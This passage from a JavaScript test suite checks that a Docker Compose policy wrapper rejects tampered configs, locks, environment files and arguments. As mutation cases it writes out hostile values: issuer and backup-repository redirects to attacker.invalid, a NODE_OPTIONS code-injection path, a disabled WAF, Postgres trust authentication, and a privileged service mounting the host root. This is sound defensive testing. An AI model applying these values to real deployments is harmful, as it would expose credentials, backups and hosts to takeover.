    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1);

    const mutations = [
      ["WAF ModSecurity disabled", (config) => {
        config.services.waf.environment.MODSEC_RULE_ENGINE = "Off";
      }],
      ["WAF anomaly threshold widened", (config) => {
        config.services.waf.environment.ANOMALY_INBOUND = "999999";
      }],
      ["control-center issuer redirected", (config) => {
        config.services["control-center"].environment.CONTROL_CENTER_OIDC_ISSUER =
          "https://attacker.invalid/realms/platform";
      }],
      ["backup retention apply mismatch", (config) => {
        config.services["backup-scheduler"].environment
          .BACKUP_SCHEDULER_ENABLE_RETENTION_APPLY = "true";
      }],
      ["Node option injection", (config) => {
        config.services["control-center"].environment.NODE_OPTIONS =
          "--require=/tmp/attacker.cjs";
      }],
    ];
    for (const [label, mutate] of mutations) {
      const config = coreAuthorityConfig();
      mutate(config);
      renderer.reset();
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const rejected = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${label} caused a second render`);
      assert.notEqual(rejected.status, 0, `${label} was accepted`);
      assert.equal(rejected.stdout, "");
      assert.match(rejected.stderr, /semantic authority/i);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted semantic projection follows the exact trusted env snapshot", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    const environmentBytes = [
      "HOSTED_WORKLOAD_LOCK=",
      "HOSTED_WORKLOAD_MODE=no-hosted",
      "DOMAIN=parity.invalid",
      "ALERTMANAGER_SECRET_GID=2222",
      "ALERTMANAGER_IMAGE=trusted.invalid/alertmanager@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
      "LOCAL_DNS_BIND=127.0.0.53",
      "WAF_HTTP_BIND=127.0.0.2:8088",
      "WAF_HTTPS_BIND=127.0.0.2:8448",
      "WAF_NGINX_ALWAYS_TLS_REDIRECT=off",
      "WAF_BLOCKING_PARANOIA=2",
      "WAF_DETECTION_PARANOIA=3",
      "WAF_ANOMALY_INBOUND=8",
      "WAF_ANOMALY_OUTBOUND=7",
      "DOCKER_SOCKET_PROXY_PORT=3376",
      "PLATFORM_NETWORK_PREFIX=parity_core",
      "MARIADB_DATA_VOLUME=enterprise_parity_mariadb",
      "BACKUP_SCHEDULER_LOG_VOLUME=platform_parity_backup_logs",
      "PROMETHEUS_RETENTION_TIME=30d",
      "CONTROL_CENTER_OIDC_ISSUER=https://issuer.parity.invalid/realms/platform",
      "CONTROL_CENTER_DATABASE_URL_SECRET_FILE=secrets/parity-control-url.txt",
      "BACKUP_SCHEDULER_ENABLE_RETENTION_APPLY=true",
      "BACKUP_SCHEDULER_ENABLE_OFFSITE=false",
      "",
    ].join("\n");
    fs.writeFileSync(sandbox.environmentFile, environmentBytes, { mode: 0o600 });
    const config = coreAuthorityConfig();
    config.services.alertmanager.group_add = ["2222"];
    config.services.alertmanager.image =
      "trusted.invalid/alertmanager@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    config.services["local-dns"].ports = [
      { host_ip: "127.0.0.53", protocol: "tcp", published: "53", target: 53 },
      { host_ip: "127.0.0.53", protocol: "udp", published: "53", target: 53 },
    ];
    config.services.waf.ports = [
      { host_ip: "127.0.0.2", protocol: "tcp", published: "8088", target: 8080 },
      { host_ip: "127.0.0.2", protocol: "tcp", published: "8448", target: 8443 },
    ];
    Object.assign(config.services.waf.environment, {
      NGINX_ALWAYS_TLS_REDIRECT: "off",
      BLOCKING_PARANOIA: "2",
      DETECTION_PARANOIA: "3",
      ANOMALY_INBOUND: "8",
      ANOMALY_OUTBOUND: "7",
    });
    config.services["control-center"].environment.CONTROL_CENTER_OIDC_ISSUER =
      "https://issuer.parity.invalid/realms/platform";
    config.services["backup-scheduler"].environment
      .BACKUP_SCHEDULER_ENABLE_RETENTION_APPLY = "true";
    config.services["docker-socket-proxy"].ports[0].published = "3376";
    config.services.prometheus.command[2] = "--storage.tsdb.retention.time=30d";
    for (const networkName of expectedCoreInventory.networks) {
      if (networkName.startsWith("platform_") && networkName !== "platform_docker_control") {
        config.networks[networkName].name = `parity_core_${networkName.slice("platform_".length)}`;
      }
    }
    config.volumes.enterprise_mariadb_data.name = "enterprise_parity_mariadb";
    config.volumes.backup_scheduler_logs.name = "platform_parity_backup_logs";
    config.secrets.control_center_database_url.file =
      path.join(sandbox.root, "secrets/parity-control-url.txt");
    config.configs.enterprise_traefik_routes.content =
      config.configs.enterprise_traefik_routes.content.replaceAll("fixture.invalid", "parity.invalid");

    const expectedBytes = `${JSON.stringify(config, null, 2)}\n`;
    writeDockerOutput(sandbox, expectedBytes);
    const accepted = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(accepted.status, 0, accepted.stderr);
    assert.equal(renderer.count(), 1);
    assert.equal(accepted.stdout, expectedBytes);
    assert.doesNotMatch(accepted.stderr, /MODULE_NOT_FOUND/);

    renderer.reset();
    const mismatched = structuredClone(config);
    mismatched.services.alertmanager.image =
      `attacker.invalid/alertmanager@sha256:${"f".repeat(64)}`;
    writeDockerOutput(sandbox, `${JSON.stringify(mismatched)}\n`);
    const rejected = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(renderer.count(), 1);
    assert.notEqual(rejected.status, 0);
    assert.equal(rejected.stdout, "");
    assert.match(rejected.stderr, /semantic authority|runtime isolation/i);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted exact Engine authority rejects grants ports topology and redirects", () => {
  const sandbox = createConsumerSandbox();
  try {
    const renderer = installCountingRenderer(sandbox);
    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(renderer.count(), 1);
    assert.doesNotMatch(baseline.stderr, /MODULE_NOT_FOUND/);
    const mutations = [
      ["port", (config) => {
        config.services.alertmanager.ports.push({
          host_ip: "0.0.0.0", published: "9093", target: 9093, protocol: "tcp",
        });
      }],
      ["network grant", (config) => {
        config.services.alertmanager.networks.platform_db_admin = null;
      }],
      ["secret grant", (config) => {
        config.services.alertmanager.secrets.push("postgres_superuser_password");
      }],
      ["config grant", (config) => {
        config.services.alertmanager.configs.push({
          source: "enterprise_traefik_routes",
          target: "/tmp/routes.yml",
        });
      }],
      ["repository bind source", (config) => {
        config.services.alertmanager.volumes = [{
          type: "bind",
          source: path.join(sandbox.root, "README.md"),
          target: "/etc/alertmanager/alertmanager.yml",
          read_only: true,
        }];
      }],
      ["volume physical redirect", (config) => {
        config.volumes.enterprise_postgres_data.name = "attacker_volume";
      }],
      ["volume external reuse", (config) => {
        config.volumes.enterprise_postgres_data.external = true;
      }],
      ["network physical redirect", (config) => {
        config.networks.platform_cache.name = "attacker_network";
      }],
      ["network internal widening", (config) => {
        config.networks.platform_cache.internal = false;
      }],
      ["network attachable widening", (config) => {
        config.networks.platform_cache.attachable = true;
      }],
      ["config content redirect", (config) => {
        config.configs.enterprise_traefik_routes.content =
          config.configs.enterprise_traefik_routes.content.replace(
            "http://control-center:8080",
            "http://attacker:8080",
          );
      }],
      ["secret repository redirect", (config) => {
        config.secrets.smtp_password.file = path.join(
          sandbox.root,
          coreSemanticPolicyDescriptor.secretFiles.redis_password,
        );
      }],
    ];
    for (const [label, mutate] of mutations) {
      const config = coreAuthorityConfig();
      mutate(config);
      for (const kind of protectedKinds) {
        assert.deepEqual(Object.keys(config[kind]).sort(), expectedCoreInventory[kind]);
      }
      renderer.reset();
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const result = runWrapper(sandbox, ["config", "--format", "json"]);
      assert.equal(renderer.count(), 1, `${label} caused a second render`);
      assert.notEqual(result.status, 0, `${label} was accepted`);
      assert.equal(result.stdout, "");
      assert.doesNotMatch(result.stderr, /MODULE_NOT_FOUND/);
      assert.match(result.stderr, /semantic authority|runtime isolation/i);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 no-hosted semantic descriptor mismatch fails closed before renderer", () => {
  const sandbox = createConsumerSandbox();
  try {
    const tamperedLock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
    tamperedLock.coreSemanticPolicy.sha256 = "f".repeat(64);
    fs.writeFileSync(sandbox.canonicalLock, `${JSON.stringify(tamperedLock, null, 2)}\n`, { mode: 0o600 });
    const configPath = path.join(sandbox.root, "core-config.json");
    fs.writeFileSync(configPath, `${JSON.stringify(coreAuthorityConfig())}\n`, { mode: 0o600 });
    const direct = spawnSync(process.execPath, [
      path.join(sandbox.scripts, "no-hosted-core-policy.mjs"),
      "--root",
      sandbox.root,
      "--lock",
      sandbox.canonicalLock,
      "--config",
      configPath,
      "--env",
      sandbox.environmentFile,
    ], { encoding: "utf8" });
    assert.notEqual(direct.status, 0, "helper accepted a mismatched policy descriptor");
    assert.equal(direct.stdout, "");
    assert.match(direct.stderr, /semantic authority rejected: policy-binding/i);
    assert.equal(fs.existsSync(sandbox.dockerMarker), false);

    writeDockerOutput(sandbox, `${JSON.stringify(coreAuthorityConfig())}\n`);
    const wrapper = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.notEqual(wrapper.status, 0, "wrapper accepted a mismatched policy descriptor");
    assert.equal(wrapper.stdout, "");
    assert.equal(fs.existsSync(sandbox.dockerMarker), false, "descriptor mismatch invoked renderer");
    assert.match(wrapper.stderr, /no-hosted lock raw digest mismatch|runtime lock is invalid/i);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA6 canonical no-hosted lock contains the exact authoritative core inventory", () => {
  const lock = JSON.parse(fs.readFileSync(canonicalNoHostedLockPath, "utf8"));
  assert.deepEqual(Object.keys(lock).sort(), [
    "brokerPolicySha256",
    "coreSemanticPolicy",
    "projectName",
    "protectedResourceNames",
    "routes",
    "state",
    "validatorVersion",
    "version",
    "workloads",
  ]);
  assert.deepEqual(lock.coreSemanticPolicy, {
    schema: "platform-no-hosted-core-capability-policy/v1",
    sha256: "6931457ee76eff59ba6788d47f4ad6cac2da4bb171a94d51ffc3b3239bb71151",
  });
  assert.equal(lock.projectName, "platform_infra_vps");
  assert.deepEqual(Object.keys(lock.protectedResourceNames).sort(), protectedKinds);
  assert.deepEqual(lock.protectedResourceNames, expectedCoreInventory);
  assert.deepEqual(
    Object.fromEntries(protectedKinds.map((kind) => [kind, lock.protectedResourceNames[kind].length])),
    { configs: 1, networks: 11, secrets: 15, services: 24, volumes: 12 },
  );
  assert.equal(lock.protectedResourceNames.services.includes("php-apache"), false);
  for (const kind of protectedKinds) {
    const names = lock.protectedResourceNames[kind];
    assert.deepEqual(names, [...new Set(names)].sort(), `${kind} inventory is not sorted/unique`);
  }
});

test("QA6 no-hosted exact inventory baseline passes end-to-end", () => {
  const sandbox = addInfraConsumer(createConsumerSandbox());
  try {
    const config = coreRuntimeConfig(expectedCoreInventory);
    writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
    const result = runInfraConsumer(sandbox);
    assert.equal(result.status, 0, result.stderr);
    const envelope = JSON.parse(
      runWrapper(sandbox).stdout,
    );
    assert.deepEqual(envelope.protectedResourceNames, expectedCoreInventory);
    assert.deepEqual(envelope.config, config);
    assert.equal(envelope.lockSha256, sha256(fs.readFileSync(sandbox.canonicalLock)));
  } finally {
    removeSandbox(sandbox);
  }
});

const candidateMissingNames = {
  configs: "enterprise_traefik_routes",
  networks: "enterprise_net",
  secrets: "alertmanager_webhook_token",
  services: "alertmanager",
  volumes: "backup_scheduler_logs",
};

for (const kind of protectedKinds) {
  test(`QA6 no-hosted rejects candidate missing one authoritative ${kind} entry`, () => {
    const sandbox = addInfraConsumer(createConsumerSandbox());
    try {
      const config = coreRuntimeConfig(expectedCoreInventory);
      delete config[kind][candidateMissingNames[kind]];
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const result = runInfraConsumer(sandbox);
      assert.notEqual(result.status, 0, `candidate missing ${kind} was auto-authorized`);
      assert.match(result.stderr, /inventory|protected|resource|authority|mismatch/i);
    } finally {
      removeSandbox(sandbox);
    }
  });
}

for (const kind of protectedKinds) {
  test(`QA6 no-hosted rejects candidate extra ${kind} before it becomes core authority`, () => {
    const sandbox = addInfraConsumer(createConsumerSandbox());
    try {
      const config = coreRuntimeConfig(expectedCoreInventory);
      if (kind === "configs") config.configs.attacker_config = { file: "/attacker/config" };
      if (kind === "networks") config.networks.attacker_network = { internal: false };
      if (kind === "secrets") config.secrets.attacker_secret = { file: "/attacker/secret" };
      if (kind === "volumes") config.volumes.attacker_volume = { name: "attacker_volume" };
      if (kind === "services") {
        config.services["attacker-daemon"] = boundedService({
          privileged: true,
          pid: "host",
          network_mode: "host",
          cap_add: ["SYS_ADMIN"],
          devices: ["/dev/null:/dev/attacker"],
          volumes: [{ type: "bind", source: "/", target: "/host" }],
        });
      }
      writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
      const result = runInfraConsumer(sandbox);
      assert.notEqual(result.status, 0, `candidate extra ${kind} was auto-authorized`);
      assert.match(result.stderr, /inventory|protected|resource|authority|mismatch/i);
    } finally {
      removeSandbox(sandbox);
    }
  });
}

function futureNoHostedLock() {
  return {
    ...JSON.parse(fs.readFileSync(canonicalNoHostedLockPath, "utf8")),
    projectName: "platform_infra_vps",
    protectedResourceNames: structuredClone(expectedCoreInventory),
  };
}

const lockInventoryMutations = [
  ...protectedKinds.map((kind) => [`missing-${kind}`, (lock) => {
    delete lock.protectedResourceNames[kind];
  }]),
  ...protectedKinds.map((kind) => [`minus-${kind}`, (lock) => {
    lock.protectedResourceNames[kind] = lock.protectedResourceNames[kind].slice(1);
  }]),
  ...protectedKinds.map((kind) => [`extra-${kind}`, (lock) => {
    lock.protectedResourceNames[kind] = [...lock.protectedResourceNames[kind], `attacker_${kind}`].sort();
  }]),
  ["duplicate", (lock) => {
    lock.protectedResourceNames.services = [
      lock.protectedResourceNames.services[0],
      ...lock.protectedResourceNames.services,
    ];
  }],
  ["unsorted", (lock) => {
    lock.protectedResourceNames.networks = [...lock.protectedResourceNames.networks].reverse();
  }],
  ["wrong-type", (lock) => {
    lock.protectedResourceNames.volumes = {};
  }],
  ["inventory-key-extra", (lock) => {
    lock.protectedResourceNames.images = [];
  }],
  ["top-level-key-extra", (lock) => {
    lock.attacker = true;
  }],
  ["project-name", (lock) => {
    lock.projectName = "attacker";
  }],
];

for (const [label, mutate] of lockInventoryMutations) {
  test(`QA6 no-hosted lock rejects ${label} before renderer`, () => {
    const sandbox = createConsumerSandbox();
    try {
      const lock = futureNoHostedLock();
      mutate(lock);
      fs.writeFileSync(sandbox.canonicalLock, `${JSON.stringify(lock, null, 2)}\n`, { mode: 0o600 });
      writeDockerOutput(sandbox, `${JSON.stringify(coreRuntimeConfig(expectedCoreInventory))}\n`);
      const result = runWrapper(sandbox);
      assert.notEqual(result.status, 0, `${label} lock inventory reached renderer`);
      assert.equal(fs.existsSync(sandbox.dockerMarker), false, `${label} lock inventory invoked Docker`);
    } finally {
      removeSandbox(sandbox);
    }
  });
}

test("QA6 no-hosted lock race preserves the initial authoritative snapshot or fails explicitly", () => {
  const sandbox = createConsumerSandbox();
  try {
    const originalLockBytes = fs.readFileSync(sandbox.canonicalLock);
    const initialLockSha256 = sha256(originalLockBytes);
    const config = coreRuntimeConfig(sandbox.inventory);
    writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);

    const baseline = runWrapper(sandbox);
    assert.equal(baseline.status, 0, baseline.stderr);
    const baselineEnvelope = JSON.parse(baseline.stdout);
    assert.equal(baselineEnvelope.lockSha256, initialLockSha256);
    assert.deepEqual(baselineEnvelope.protectedResourceNames, expectedCoreInventory);
    assert.deepEqual(baselineEnvelope.config, config);

    const foreignLock = path.join(sandbox.root, "foreign-no-hosted.lock.json");
    fs.writeFileSync(foreignLock, originalLockBytes, { mode: 0o600 });
    const foreign = runWrapper(sandbox, undefined, {
      HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE: foreignLock,
    });
    assert.notEqual(foreign.status, 0, "copied no-hosted lock bypassed canonical path binding");

    fs.writeFileSync(sandbox.canonicalLock, "{}\n", { mode: 0o600 });
    const preTampered = runWrapper(sandbox);
    assert.notEqual(preTampered.status, 0, "pre-tampered canonical lock reached Docker");
    fs.writeFileSync(sandbox.canonicalLock, originalLockBytes, { mode: 0o600 });

    const replacement = path.join(sandbox.root, "swap-lock-replacement");
    const replacementBytes = Buffer.from('{"attacker":true}\n');
    fs.writeFileSync(replacement, replacementBytes, { mode: 0o600 });
    const raced = runWrapper(sandbox);
    assert.equal(
      fs.existsSync(path.join(sandbox.root, "lock-swap-fired")),
      true,
      "lock race fake renderer did not execute the swap",
    );
    if (raced.status !== 0) {
      assert.match(
        raced.stderr,
        /(?:no-hosted|lock).*(?:changed|identity|snapshot|swap|digest|invalid|mismatch|tampered)|(?:changed|identity|snapshot|swap|digest|invalid|mismatch|tampered).*(?:no-hosted|lock)/i,
        `lock race failed for an unrelated reason:\n${raced.stderr}`,
      );
    } else {
      const racedEnvelope = JSON.parse(raced.stdout);
      assert.equal(racedEnvelope.lockSha256, initialLockSha256);
      assert.notEqual(racedEnvelope.lockSha256, sha256(replacementBytes));
      assert.deepEqual(racedEnvelope.protectedResourceNames, expectedCoreInventory);
      assert.deepEqual(racedEnvelope.config, config);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA6 no-hosted env bytes are stable from mode parse through Compose render", () => {
  const sandbox = createConsumerSandbox();
  try {
    const initialEnvironment = "HOSTED_WORKLOAD_LOCK=\nHOSTED_WORKLOAD_MODE=no-hosted\nCORE_VALUE=trusted\nDOMAIN=fixture.invalid\n";
    fs.writeFileSync(sandbox.environmentFile, initialEnvironment, { mode: 0o600 });
    const hostileEnvironment = path.join(sandbox.root, "swap-env-replacement");
    fs.writeFileSync(
      hostileEnvironment,
      "HOSTED_WORKLOAD_LOCK=/attacker.lock\nHOSTED_WORKLOAD_MODE=hosted\nCORE_VALUE=hostile\nDOMAIN=attacker.invalid\n",
      { mode: 0o600 },
    );
    writeDockerOutput(sandbox, `${JSON.stringify(coreRuntimeConfig(sandbox.inventory))}\n`);
    const baseline = runWrapper(sandbox);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(fs.readFileSync(sandbox.dockerEnvironmentCapture, "utf8"), initialEnvironment);

    fs.rmSync(sandbox.dockerMarker, { force: true });
    fs.rmSync(sandbox.dockerEnvironmentCapture, { force: true });
    fs.writeFileSync(path.join(sandbox.root, "swap-env-trigger"), "swap\n", { mode: 0o600 });
    const raced = runWrapper(sandbox);
    assert.equal(
      fs.existsSync(path.join(sandbox.root, "env-swap-fired")),
      true,
      "env race fake renderer did not execute the swap",
    );
    const consumedBytes = fs.existsSync(sandbox.dockerEnvironmentCapture)
      ? fs.readFileSync(sandbox.dockerEnvironmentCapture, "utf8")
      : "";
    if (raced.status !== 0) {
      assert.match(
        raced.stderr,
        /(?:environment|env).*(?:changed|identity|snapshot|swap|digest|invalid|mismatch|tampered)|(?:changed|identity|snapshot|swap|digest|invalid|mismatch|tampered).*(?:environment|env)/i,
        `env race failed for an unrelated reason:\n${raced.stderr}`,
      );
    } else {
      assert.equal(consumedBytes, initialEnvironment, `Compose consumed swapped env bytes:\n${consumedBytes}`);
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA7 Compose renderer receives only the minimal authoritative process environment", () => {
  const sandbox = createConsumerSandbox();
  try {
    const config = coreAuthorityConfig();
    writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
    const rendered = runWrapper(
      sandbox,
      ["config", "--format", "json"],
      {
        KC_HOSTNAME_STRICT: "false",
        POSTGRES_IMAGE: `attacker.invalid/postgres@sha256:${"f".repeat(64)}`,
      },
    );
    assert.equal(rendered.status, 0, rendered.stderr);
    assert.deepEqual(JSON.parse(rendered.stdout), config);
    const rendererEnvironment =
      fs.readFileSync(sandbox.dockerProcessEnvironmentCapture, "utf8");
    assert.doesNotMatch(rendererEnvironment, /^KC_HOSTNAME_STRICT=/m);
    assert.doesNotMatch(rendererEnvironment, /^POSTGRES_IMAGE=/m);
    assert.match(rendererEnvironment, /^DOCKER_HOST=unix:\/\/\/var\/run\/docker\.sock$/m);
    assert.match(
      rendererEnvironment,
      new RegExp(
        `^HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE=${sandbox.canonicalLock.replaceAll(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`,
        "m",
      ),
    );
    assert.match(
      rendererEnvironment,
      new RegExp(`^PATH=${sandbox.environment.PATH.replaceAll(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`, "m"),
    );
    if (process.env.HOME) {
      assert.match(
        rendererEnvironment,
        new RegExp(`^HOME=${process.env.HOME.replaceAll(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`, "m"),
      );
    }
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA6 PREPARE_RESOLVED accepts only exact hosted mode and forbids envelope", () => {
  const sandbox = createConsumerSandbox();
  try {
    writeDockerOutput(sandbox, `${JSON.stringify(coreRuntimeConfig(sandbox.inventory))}\n`);
    const prepareEnvironment = {
      HOSTED_WORKLOAD_LOCK: "",
      HOSTED_WORKLOAD_MODE: "hosted",
      HOSTED_WORKLOAD_PREPARE_RESOLVED: "1",
      HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE: sandbox.workloadLock,
    };
    const positive = runWrapper(sandbox, ["config", "--format", "json"], prepareEnvironment);
    assert.equal(positive.status, 0, positive.stderr);
    fs.rmSync(sandbox.dockerMarker, { force: true });
    const envelope = runWrapper(sandbox, ["runtime-isolation-envelope"], prepareEnvironment);
    assert.notEqual(envelope.status, 0, "PREPARE_RESOLVED emitted a semantic envelope");
    assert.equal(fs.existsSync(sandbox.dockerMarker), false, "forbidden PREPARE envelope reached Docker");

    const acceptedModes = [];
    for (const mode of ["", "no-hosted", "evil", "HOSTED", " hosted", "hosted ", "No-hosted", "NO-HOSTED"]) {
      fs.rmSync(sandbox.dockerMarker, { force: true });
      const result = runWrapper(sandbox, ["config", "--format", "json"], {
        ...prepareEnvironment,
        HOSTED_WORKLOAD_MODE: mode,
      });
      if (result.status === 0 || fs.existsSync(sandbox.dockerMarker)) acceptedModes.push(mode);
    }
    assert.deepEqual(acceptedModes, [], `PREPARE accepted non-exact modes: ${JSON.stringify(acceptedModes)}`);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA6 infra runtime-isolation CLI closes argv before invoking the renderer", () => {
  const sandbox = addInfraConsumer(createConsumerSandbox());
  try {
    writeDockerOutput(sandbox, `${JSON.stringify(coreRuntimeConfig(sandbox.inventory))}\n`);
    for (const allowedArguments of [
      ["--env-file", sandbox.environmentFile],
      ["--envFile", sandbox.environmentFile],
      [`--env-file=${sandbox.environmentFile}`],
      [`--envFile=${sandbox.environmentFile}`],
    ]) {
      fs.rmSync(sandbox.dockerMarker, { force: true });
      const allowed = runInfraArguments(sandbox, allowedArguments);
      assert.equal(allowed.status, 0, allowed.stderr);
    }

    const accepted = [];
    for (const [label, arguments_] of [
      ["unknown split", ["--env-file", sandbox.environmentFile, "--foo", "attacker"]],
      ["unknown equals", ["--env-file", sandbox.environmentFile, "--foo=attacker"]],
      ["unknown flag", ["--env-file", sandbox.environmentFile, "--foo"]],
      ["positional", ["--env-file", sandbox.environmentFile, "attacker-positional"]],
      ["duplicate env-file", [
        "--env-file", sandbox.environmentFile,
        "--env-file", sandbox.environmentFile,
      ]],
      ["both aliases", [
        "--env-file", sandbox.environmentFile,
        "--envFile", sandbox.environmentFile,
      ]],
      ["empty env-file", ["--env-file="]],
      ["empty envFile", ["--envFile="]],
    ]) {
      fs.rmSync(sandbox.dockerMarker, { force: true });
      const result = runInfraArguments(sandbox, arguments_);
      const rendererInvoked = fs.existsSync(sandbox.dockerMarker);
      if (result.status === 0 || rendererInvoked) {
        accepted.push(label);
      } else {
        assert.match(
          result.stderr,
          /argument|argv|option|unknown|invalid|forbidden|duplicate|empty/i,
          `${label} failed before renderer for an unrelated reason:\n${result.stderr}`,
        );
      }
    }
    assert.deepEqual(accepted, [], `runtime-isolation-check accepted unknown argv: ${accepted.join(", ")}`);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA8 exact overlay golden preserves the four independently derived canonical states", () => {
  const sandbox = createConsumerSandbox();
  try {
    const environment = installQa8Environment(sandbox);
    const config = qa8IndependentGolden(sandbox);
    materializeQa8CanonicalSources(sandbox, config);
    const lock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
    const violations = validateNoHostedCoreAuthority(
      lock,
      config,
      sandbox.root,
      environment,
    );
    assert.deepEqual(
      violations,
      [],
      `canonical nine-overlay states were rejected: ${violations.join(",")}`,
    );
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA8 exact environment authority rejects same-name security and endpoint widening", () => {
  const sandbox = createConsumerSandbox();
  try {
    const environment = installQa8Environment(sandbox);
    const lock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
    const baseline = selectQa8AcceptedBaseline(sandbox, lock, environment);
    materializeQa8CanonicalSources(sandbox, baseline.config);
    assert.deepEqual(
      validateNoHostedCoreAuthority(lock, baseline.config, sandbox.root, environment),
      [],
      "selected independent baseline is not accepted before mutation",
    );
    const mutations = [
      ["postgres trust", "postgres", "POSTGRES_HOST_AUTH_METHOD", "trust"],
      ["keycloak non-strict", "keycloak", "KC_HOSTNAME_STRICT", "false"],
      ["grafana anonymous", "grafana", "GF_AUTH_ANONYMOUS_ENABLED", "true"],
      [
        "control-center token endpoint",
        "control-center",
        "CONTROL_CENTER_OIDC_TOKEN_ENDPOINT",
        "https://attacker.invalid/token",
      ],
      ["waf method widening", "waf", "ALLOWED_METHODS", "GET HEAD POST TRACE CONNECT"],
      [
        "scheduler repository redirect",
        "backup-scheduler",
        "RESTIC_REPOSITORY",
        "s3:https://attacker.invalid/backup",
      ],
    ];
    const accepted = [];
    for (const [label, serviceName, key, value] of mutations) {
      const config = structuredClone(baseline.config);
      config.services[serviceName].environment ??= {};
      config.services[serviceName].environment[key] = value;
      const violations = validateNoHostedCoreAuthority(
        lock,
        config,
        sandbox.root,
        environment,
      );
      if (!violations.some((violation) =>
        violation.includes(serviceName) && violation.includes("environment"))) {
        accepted.push(label);
      }
    }
    assert.deepEqual(accepted, [], `same-name environment widening was accepted: ${accepted.join(", ")}`);
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA8 environment widening cannot reach core create or start", () => {
  const fixture = createConsumerSandbox();
  let baselineConfig;
  try {
    const environment = installQa8Environment(fixture);
    const lock = JSON.parse(fs.readFileSync(fixture.canonicalLock, "utf8"));
    baselineConfig = selectQa8AcceptedBaseline(fixture, lock, environment).config;
    materializeQa8CanonicalSources(fixture, baselineConfig);
  } finally {
    removeSandbox(fixture);
  }
  const baselineScenario = runCoreStackNoHostedScenario(
    baselineConfig,
    { materializeSources: true },
  );
  try {
    const createCalls = baselineScenario.log.split("\n")
      .filter((line) => /(?:^| )create(?: |$)/.test(line));
    const startCalls = baselineScenario.log.split("\n")
      .filter((line) => /^--host unix:\/\/\/var\/run\/docker\.sock start(?: |$)/.test(line));
    assert.equal(baselineScenario.result.status, 0, baselineScenario.result.stderr);
    assert.equal(createCalls.length, 1, `baseline create count: ${baselineScenario.log}`);
    assert.equal(startCalls.length, 1, `baseline start count: ${baselineScenario.log}`);
  } finally {
    fs.rmSync(baselineScenario.root, { recursive: true, force: true });
  }
  const accepted = [];
  for (const [label, serviceName, mutate] of [
    ["postgres trust", "postgres", (config) => {
      config.services.postgres.environment.POSTGRES_HOST_AUTH_METHOD = "trust";
    }],
    ["grafana anonymous", "grafana", (config) => {
      config.services.grafana.environment.GF_AUTH_ANONYMOUS_ENABLED = "true";
    }],
  ]) {
    const config = structuredClone(baselineConfig);
    mutate(config);
    const scenario = runCoreStackNoHostedScenario(config, { materializeSources: true });
    try {
      const createCalls = scenario.log.split("\n").filter((line) => /(?:^| )create(?: |$)/.test(line));
      const startCalls = scenario.log.split("\n").filter((line) =>
        /^--host unix:\/\/\/var\/run\/docker\.sock start(?: |$)/.test(line));
      if (scenario.result.status === 0 || createCalls.length > 0 || startCalls.length > 0) {
        accepted.push({
          label,
          status: scenario.result.status,
          create: createCalls.length,
          start: startCalls.length,
        });
      } else {
        assert.match(
          scenario.result.stderr,
          new RegExp(`semantic authority.*${serviceName}.*environment`, "is"),
          `${label} failed before Engine sinks for an unrelated reason:\n${scenario.result.stderr}`,
        );
      }
    } finally {
      fs.rmSync(scenario.root, { recursive: true, force: true });
    }
  }
  assert.deepEqual(accepted, [], `environment widening reached Engine sinks: ${JSON.stringify(accepted)}`);
});

test("QA8 exact service and top-level authority rejects every safe-looking semantic drift", () => {
  const sandbox = createConsumerSandbox();
  try {
    const environment = installQa8Environment(sandbox);
    const lock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
    const baseline = selectQa8AcceptedBaseline(sandbox, lock, environment);
    materializeQa8CanonicalSources(sandbox, baseline.config);
    assert.deepEqual(
      validateNoHostedCoreAuthority(lock, baseline.config, sandbox.root, environment),
      [],
      "selected independent baseline is not accepted before mutation",
    );
    const mutations = [
      ["pids_limit", /postgres/i, (config) => {
        config.services.postgres.pids_limit = 2_147_483_647;
      }],
      ["working_dir", /postgres/i, (config) => { config.services.postgres.working_dir = "/tmp"; }],
      ["init", /postgres/i, (config) => { config.services.postgres.init = false; }],
